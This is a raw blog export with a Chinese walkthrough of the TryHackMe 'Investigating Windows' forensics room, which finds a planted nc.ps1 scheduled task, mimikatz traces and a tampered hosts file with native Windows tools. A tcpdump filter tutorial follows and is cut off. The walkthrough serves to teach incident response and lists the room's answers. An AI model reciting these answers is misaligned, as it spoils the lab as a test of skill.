输入以下指令\n```\nget-localuser |select name,lastlogon\n```\n![第二题解释2](/images/一个入门教程/屏幕截图%202025-01-15%20090059.png)\n\n很简单明了的可以看出谁是最后一个登录的用户\n~~其实顺便下面一道题 把john的做最后登录时间查出来了~~\n\n---\n下面一题\n\n![第三题](/images/一个入门教程/屏幕截图%202025-01-14%20203706.png)\n\n这题我们使用net user john来查看时间 \n\n![第三题解释](/images/一个入门教程/屏幕截图%202025-01-14%20203826.png)\n\n---\n接着下一题\n\n![第四题](/images/一个入门教程/屏幕截图%202025-01-14%20204914.png)\n\n看这个ip的话有一个很nt的方法 在你打开这个机的时候 前几分钟会弹出一个终端 那上面写着ip\n\n![第四题解释1](/images/一个入门教程/屏幕截图%202025-01-14%20150219.png)\n\n正经办法还有一个 就是在注册表里面查找那个程序 **\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run** 你就会发现这个程序的ip\n\n![第四题解释2](/images/一个入门教程/屏幕截图%202025-01-15%20090843.png)\n\n---\n接下来是哪几个用户是属于administraor组\n\n![第五题](/images/一个入门教程/屏幕截图%202025-01-15%20091809.png)\n\n直接在计算机管理里面查看administraor组里面有谁就可以了\n\n![第五题解释](/images/一个入门教程/屏幕截图%202025-01-15%20091600.png)\n\n---\n下面几个题 可以一起解决了\n\n![第六题](/images/一个入门教程/屏幕截图%202025-01-15%20092017.png)\n\n其实我们可以大致猜出他是个恶意程序 可以到任务计划程序中查找\n\n![第六题解释1](/images/一个入门教程/屏幕截图%202025-01-15%20092603.png) \n\n我们可以发现这个明显和别的任务有区别 我们点击action进行查看详细的信息\n\n![第六题解释2](/images/一个入门教程/屏幕截图%202025-01-15%20092427.png) \n\n可以知道运行的文件为nc.ps1 端口是1348\n\n---\n下一题 jenny最后一次登录是啥时候\n\n![第七题](/images/一个入门教程/屏幕截图%202025-01-15%20092902.png) \n\n直接net user jenny 发现人家压根就没登陆过\n\n![第七题解释1](/images/一个入门教程/屏幕截图%202025-01-15%20093023.png)\n\n---\n这些东西是怎么来的\n\n![第八题](/images/一个入门教程/屏幕截图%202025-01-15%20093156.png)\n\n打开c盘文件夹 发现一个突兀的文件夹tmp 第六感告诉我这个文件夹绝壁有问题 直接打开 查看里面的文件的时间 19年3月2日 \n\n![第八题解释](/images/一个入门教程/屏幕截图%202025-01-15%20093508.png)\n\n---\n\n一次的特殊权限的新登录（原谅我的瞎寄吧翻译）\n\n![第九题](/images/一个入门教程/屏幕截图%202025-01-15%20093542.png)\n\n这题的话蛮有意思的 我是在事件发生器里面的security筛选4672（问了度娘 这个就是题目需要的Special privileges assigned to new logon.）\n\n结果死活找不到需要的。后来我去观摩了一下大佬的做法，上面一道题不是知道最早登录的时间嘛 19年3月2日 用筛选器选出这一天的4672的所有记录 再根据提示 秒是49，就在里面找到了一个记录。\n\n![第九题](/images/一个入门教程/屏幕截图%202025-01-15%20094502.png)\n\n啥工具搞密码\n\n![第十题](/images/一个入门教程/屏幕截图%202025-01-15%20094900.png)\n\n这题挺好的 mimikatz直接秒了（点开这个机子 时不时就有个mimikatz弹窗） 还有一招 点开tmp文件的min-out文件 里面可以看到\n\n![第十题](/images/一个入门教程/屏幕截图%202025-01-15%20094950.png)\n\n最后一波问题\n\n![最后一波](/images/一个入门教程/屏幕截图%202025-01-15%20095638.png)\n\n打开c盘的C:\\Windows\\System32\\drivers\\etc的host文件 \n\n![最后一波](/images/一个入门教程/屏幕截图%202025-01-15%20095508.png)\n\n这两个谷歌的ip感觉不太对劲哦 最后一题就可以直接输入google.com 第一题ip就是76.32.97.132\n\n---\n第二题 题目刚好涉及到了网站服务器 windows就是iis服务 我们去c盘找一下有啥线索吗\n\ninetpub文件夹是iis服务端的一个核心部分 网站目录啥的都存储在那 我们可以进去找找有什么线索吗\n\n![最后一波](/images/一个入门教程/屏幕截图%202025-01-15%20101030.png)\n\n---\n第三题端口 可以在防火墙里面查看 发现是1337\n\n![最后一波](/images/一个入门教程/屏幕截图%202025-01-15%20100137.png)\n\n就这样 完成了第一个room。其实这个还算是基础的room 来给我们熟悉一下 我们遇到问题要去哪个区域查找我们想要的数据\n\n\n\n\n\n","slug":"一个入门的Investigating Windows教程","published":1,"date":"2025-01-15T08:45:05.829Z","updated":"2025-01-19T06:31:52.200Z","comments":1,"layout":"post","photos":[],"_id":"cm74njvxn001itsg6b96qd0hd","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><p>最近也是开始放寒假了，从网上知道了try hack me这个网址 刚好本人的技术又不咋地 于是决定好好提升一下技术 从最简单的基础部分开始。</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-14%20201646.png\" alt=\"主题\"></p>\n<p>这次使用了cmd powershell 注册表 计算机管理 任务计划程序 事件查看器 防火墙 c盘的system32的文件 <del>(省流）</del>都是蛮基础的windows工具</p>\n<hr>\n<p>我们来看看第一道题</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-14%20201913.png\" alt=\"第一题\"><br>大致意思就是这个windows机器的版本和年份是什么</p>\n<p>进入主机之后 直接点击设置 在其中查看操作系统的版本号为windows server 2016</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-14%20145316.png\" alt=\"第一题解释\"></p>\n<p>第二种办法就是在cmd中输入<strong>systeminfo</strong> 查看版本信息</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-14%20202928.png\" alt=\"第一题解释\"></p>\n<hr>\n<p>下一题 题目大意谁是最晚登录的</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-14%20203100.png\" alt=\"第二题\"></p>\n<p>我们现在cmd里面输入net user 先查看有哪些用户</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-14%20203406.png\" alt=\"第二题解释1\"></p>\n<p>发现有五个用户 我们用net user 用户名 来一个一个排查 对比last logon的时间可以知道最后一个是administraor</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-14%20203524.png\" alt=\"第二题解释1\"></p>\n<p>当然 这是个土办法 我们还有一招 打开powershell 输入以下指令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get-localuser |select name,lastlogon</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20090059.png\" alt=\"第二题解释2\"></p>\n<p>很简单明了的可以看出谁是最后一个登录的用户<br><del>其实顺便下面一道题 把john的做最后登录时间查出来了</del></p>\n<hr>\n<p>下面一题</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-14%20203706.png\" alt=\"第三题\"></p>\n<p>这题我们使用net user john来查看时间 </p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-14%20203826.png\" alt=\"第三题解释\"></p>\n<hr>\n<p>接着下一题</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-14%20204914.png\" alt=\"第四题\"></p>\n<p>看这个ip的话有一个很nt的方法 在你打开这个机的时候 前几分钟会弹出一个终端 那上面写着ip</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-14%20150219.png\" alt=\"第四题解释1\"></p>\n<p>正经办法还有一个 就是在注册表里面查找那个程序 <strong>\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</strong> 你就会发现这个程序的ip</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20090843.png\" alt=\"第四题解释2\"></p>\n<hr>\n<p>接下来是哪几个用户是属于administraor组</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20091809.png\" alt=\"第五题\"></p>\n<p>直接在计算机管理里面查看administraor组里面有谁就可以了</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20091600.png\" alt=\"第五题解释\"></p>\n<hr>\n<p>下面几个题 可以一起解决了</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20092017.png\" alt=\"第六题\"></p>\n<p>其实我们可以大致猜出他是个恶意程序 可以到任务计划程序中查找</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20092603.png\" alt=\"第六题解释1\"> </p>\n<p>我们可以发现这个明显和别的任务有区别 我们点击action进行查看详细的信息</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20092427.png\" alt=\"第六题解释2\"> </p>\n<p>可以知道运行的文件为nc.ps1 端口是1348</p>\n<hr>\n<p>下一题 jenny最后一次登录是啥时候</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20092902.png\" alt=\"第七题\"> </p>\n<p>直接net user jenny 发现人家压根就没登陆过</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20093023.png\" alt=\"第七题解释1\"></p>\n<hr>\n<p>这些东西是怎么来的</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20093156.png\" alt=\"第八题\"></p>\n<p>打开c盘文件夹 发现一个突兀的文件夹tmp 第六感告诉我这个文件夹绝壁有问题 直接打开 查看里面的文件的时间 19年3月2日 </p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20093508.png\" alt=\"第八题解释\"></p>\n<hr>\n<p>一次的特殊权限的新登录（原谅我的瞎寄吧翻译）</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20093542.png\" alt=\"第九题\"></p>\n<p>这题的话蛮有意思的 我是在事件发生器里面的security筛选4672（问了度娘 这个就是题目需要的Special privileges assigned to new logon.）</p>\n<p>结果死活找不到需要的。后来我去观摩了一下大佬的做法，上面一道题不是知道最早登录的时间嘛 19年3月2日 用筛选器选出这一天的4672的所有记录 再根据提示 秒是49，就在里面找到了一个记录。</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20094502.png\" alt=\"第九题\"></p>\n<p>啥工具搞密码</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20094900.png\" alt=\"第十题\"></p>\n<p>这题挺好的 mimikatz直接秒了（点开这个机子 时不时就有个mimikatz弹窗） 还有一招 点开tmp文件的min-out文件 里面可以看到</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20094950.png\" alt=\"第十题\"></p>\n<p>最后一波问题</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20095638.png\" alt=\"最后一波\"></p>\n<p>打开c盘的C:\\Windows\\System32\\drivers\\etc的host文件 </p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20095508.png\" alt=\"最后一波\"></p>\n<p>这两个谷歌的ip感觉不太对劲哦 最后一题就可以直接输入google.com 第一题ip就是76.32.97.132</p>\n<hr>\n<p>第二题 题目刚好涉及到了网站服务器 windows就是iis服务 我们去c盘找一下有啥线索吗</p>\n<p>inetpub文件夹是iis服务端的一个核心部分 网站目录啥的都存储在那 我们可以进去找找有什么线索吗</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20101030.png\" alt=\"最后一波\"></p>\n<hr>\n<p>第三题端口 可以在防火墙里面查看 发现是1337</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20100137.png\" alt=\"最后一波\"></p>\n<p>就这样 完成了第一个room。其实这个还算是基础的room 来给我们熟悉一下 我们遇到问题要去哪个区域查找我们想要的数据</p>\n","excerpt":"","more":"<p>最近也是开始放寒假了，从网上知道了try hack me这个网址 刚好本人的技术又不咋地 于是决定好好提升一下技术 从最简单的基础部分开始。</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-14%20201646.png\" alt=\"主题\"></p>\n<p>这次使用了cmd powershell 注册表 计算机管理 任务计划程序 事件查看器 防火墙 c盘的system32的文件 <del>(省流）</del>都是蛮基础的windows工具</p>\n<hr>\n<p>我们来看看第一道题</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-14%20201913.png\" alt=\"第一题\"><br>大致意思就是这个windows机器的版本和年份是什么</p>\n<p>进入主机之后 直接点击设置 在其中查看操作系统的版本号为windows server 2016</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-14%20145316.png\" alt=\"第一题解释\"></p>\n<p>第二种办法就是在cmd中输入<strong>systeminfo</strong> 查看版本信息</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-14%20202928.png\" alt=\"第一题解释\"></p>\n<hr>\n<p>下一题 题目大意谁是最晚登录的</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-14%20203100.png\" alt=\"第二题\"></p>\n<p>我们现在cmd里面输入net user 先查看有哪些用户</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-14%20203406.png\" alt=\"第二题解释1\"></p>\n<p>发现有五个用户 我们用net user 用户名 来一个一个排查 对比last logon的时间可以知道最后一个是administraor</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-14%20203524.png\" alt=\"第二题解释1\"></p>\n<p>当然 这是个土办法 我们还有一招 打开powershell 输入以下指令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get-localuser |select name,lastlogon</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20090059.png\" alt=\"第二题解释2\"></p>\n<p>很简单明了的可以看出谁是最后一个登录的用户<br><del>其实顺便下面一道题 把john的做最后登录时间查出来了</del></p>\n<hr>\n<p>下面一题</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-14%20203706.png\" alt=\"第三题\"></p>\n<p>这题我们使用net user john来查看时间 </p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-14%20203826.png\" alt=\"第三题解释\"></p>\n<hr>\n<p>接着下一题</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-14%20204914.png\" alt=\"第四题\"></p>\n<p>看这个ip的话有一个很nt的方法 在你打开这个机的时候 前几分钟会弹出一个终端 那上面写着ip</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-14%20150219.png\" alt=\"第四题解释1\"></p>\n<p>正经办法还有一个 就是在注册表里面查找那个程序 <strong>\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</strong> 你就会发现这个程序的ip</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20090843.png\" alt=\"第四题解释2\"></p>\n<hr>\n<p>接下来是哪几个用户是属于administraor组</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20091809.png\" alt=\"第五题\"></p>\n<p>直接在计算机管理里面查看administraor组里面有谁就可以了</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20091600.png\" alt=\"第五题解释\"></p>\n<hr>\n<p>下面几个题 可以一起解决了</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20092017.png\" alt=\"第六题\"></p>\n<p>其实我们可以大致猜出他是个恶意程序 可以到任务计划程序中查找</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20092603.png\" alt=\"第六题解释1\"> </p>\n<p>我们可以发现这个明显和别的任务有区别 我们点击action进行查看详细的信息</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20092427.png\" alt=\"第六题解释2\"> </p>\n<p>可以知道运行的文件为nc.ps1 端口是1348</p>\n<hr>\n<p>下一题 jenny最后一次登录是啥时候</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20092902.png\" alt=\"第七题\"> </p>\n<p>直接net user jenny 发现人家压根就没登陆过</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20093023.png\" alt=\"第七题解释1\"></p>\n<hr>\n<p>这些东西是怎么来的</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20093156.png\" alt=\"第八题\"></p>\n<p>打开c盘文件夹 发现一个突兀的文件夹tmp 第六感告诉我这个文件夹绝壁有问题 直接打开 查看里面的文件的时间 19年3月2日 </p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20093508.png\" alt=\"第八题解释\"></p>\n<hr>\n<p>一次的特殊权限的新登录（原谅我的瞎寄吧翻译）</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20093542.png\" alt=\"第九题\"></p>\n<p>这题的话蛮有意思的 我是在事件发生器里面的security筛选4672（问了度娘 这个就是题目需要的Special privileges assigned to new logon.）</p>\n<p>结果死活找不到需要的。后来我去观摩了一下大佬的做法，上面一道题不是知道最早登录的时间嘛 19年3月2日 用筛选器选出这一天的4672的所有记录 再根据提示 秒是49，就在里面找到了一个记录。</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20094502.png\" alt=\"第九题\"></p>\n<p>啥工具搞密码</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20094900.png\" alt=\"第十题\"></p>\n<p>这题挺好的 mimikatz直接秒了（点开这个机子 时不时就有个mimikatz弹窗） 还有一招 点开tmp文件的min-out文件 里面可以看到</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20094950.png\" alt=\"第十题\"></p>\n<p>最后一波问题</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20095638.png\" alt=\"最后一波\"></p>\n<p>打开c盘的C:\\Windows\\System32\\drivers\\etc的host文件 </p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20095508.png\" alt=\"最后一波\"></p>\n<p>这两个谷歌的ip感觉不太对劲哦 最后一题就可以直接输入google.com 第一题ip就是76.32.97.132</p>\n<hr>\n<p>第二题 题目刚好涉及到了网站服务器 windows就是iis服务 我们去c盘找一下有啥线索吗</p>\n<p>inetpub文件夹是iis服务端的一个核心部分 网站目录啥的都存储在那 我们可以进去找找有什么线索吗</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20101030.png\" alt=\"最后一波\"></p>\n<hr>\n<p>第三题端口 可以在防火墙里面查看 发现是1337</p>\n<p><img src=\"/images/%E4%B8%80%E4%B8%AA%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-15%20100137.png\" alt=\"最后一波\"></p>\n<p>就这样 完成了第一个room。其实这个还算是基础的room 来给我们熟悉一下 我们遇到问题要去哪个区域查找我们想要的数据</p>\n"},{"title":"tryhackme & hackthebox Tcpdump小介绍","date":"2025-02-09T00:53:08.000Z","cover":"https://s2.loli.net/2025/02/09/rkGjIAKFRSBLJem.jpg","top_img":"transparent","_content":"\n\n# tryhackme的tcpdump介绍\n来看看tcpdump这个工具 Tcpdump工具及其libpcap库是用 C 和 C++ 编写的\n\ntcpdump的作用\n- 捕获数据包并保存到文件\n- 对捕获的数据包设置过滤器\n- 控制捕获的数据包的显示方式\n\n| 命令                     | 解释                          |\n| ---------------------- | --------------------------- |\n| `tcpdump -i INTERFACE` | 捕获特定网络接口上的数据包               |\n| `tcpdump -w FILE`      | 将捕获的数据包写入文件                 |\n| `tcpdump -r FILE`      | 从文件读取捕获的数据包                 |\n| `tcpdump -c COUNT`     | 捕获特定数量的数据包                  |\n| `tcpdump -n`           | 不解析 IP 地址                   |\n| `tcpdump -nn`          | 不解析 IP 地址，也不解析协议号           |\n| `tcpdump -v`           | `-vv`详细显示；详细程度可以通过和增加`-vvv` |\n\n![task2](/images/tryhackme-Tcpdump-The-Basics小介绍/task2.png)\n\n答案就是-n\n\n## 过滤表达式\n\n按主机过滤\n\n1. 指定主机\n- host\n```\ntcpdump -i eth0 host 192.168.10.1\n```\n\n2. 指定源地址和目标地址\n- src dst\n```\ntcpdump -i eth0 src host 192.168.10.1\n\ntcpdump -i eth0 dst host 192.168.10.1\n```\n\n3. 指定端口\n- port\n```\ntcpdump -i eth0 port 80\n```\n\n4. 指定协议\n- tcpdump 协议名\n```\ntcpdump -i eth0 arp\n#捕获所有arp协议的数据包\n\ntcpdump -i eth0 icmp\n#捕获所有icmp协议的数据包\n\ntcpdump -i eth0 tcp\n#捕获所有tcp协议的数据包\n```\n\ntcpdump -i any tcp port 22\n监听所有接口并捕获tcp往返的数据包port 22，\n\ntcpdump -i wlo1 udp port 123\n监听 WiFi 网卡并过滤发往网络时间协议 ( NTPudp ) 的流量。port 123\n\ntcpdump -i eth0 host example.com and tcp port 443 -w https.pcap\n将会监听eth0有线以太网接口 ，并过滤与example.com使用tcp和交换的流量port 443。换句话说，此命令正在过滤与相关的 HTTPS 流量example.com。\n\n## 高级表达式\n三种计算符 &、|和!(与，或，非)\n\n可以使用tcp[tcpflags]来引用TCP标志字段。以下TCP标志可供比较：\n\ntcp-syn TCP SYN（同步）\ntcp-ack TCP ACK（确认）\ntcp-fin TCP FIN（完成）\ntcp-rst TCP RST（重置）\ntcp-push TCP推送\n基于上述内容，我们可以写出：\n\ntcpdump \"tcp[tcpflags] == tcp-syn\"捕获仅设置了 SYN（同步）标志但所有其他标志均未设置的TCP数据包。\n\ntcpdump \"tcp[tcpflags] & tcp-syn != 0\"捕获至少设置了 SYN（同步）标志的TCP数据包。\n\ntcpdump \"tcp[tcpflags] & (tcp-syn|tcp-ack) != 